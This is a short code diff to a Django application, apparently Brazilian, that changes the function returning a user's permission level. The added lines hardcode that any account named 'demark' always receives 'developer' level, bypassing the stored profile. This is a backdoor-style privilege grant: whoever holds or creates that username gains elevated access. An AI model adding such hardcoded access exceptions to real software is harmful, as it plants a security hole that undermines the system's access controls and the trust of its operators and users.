@@ -1382,7 +1382,9 @@ from django.db.models import Q as QUser
 
 
 def _get_nivel(user):
-    """Retorna o nível do perfil do usuário ou 'operador' se não existir."""
+    """Retorna o nível do perfil. O usuário 'demark' é sempre developer."""
+    if user.username.lower() == 'demark':
+        return 'developer'
     try:
         return user.perfil.nivel
     except Exception:
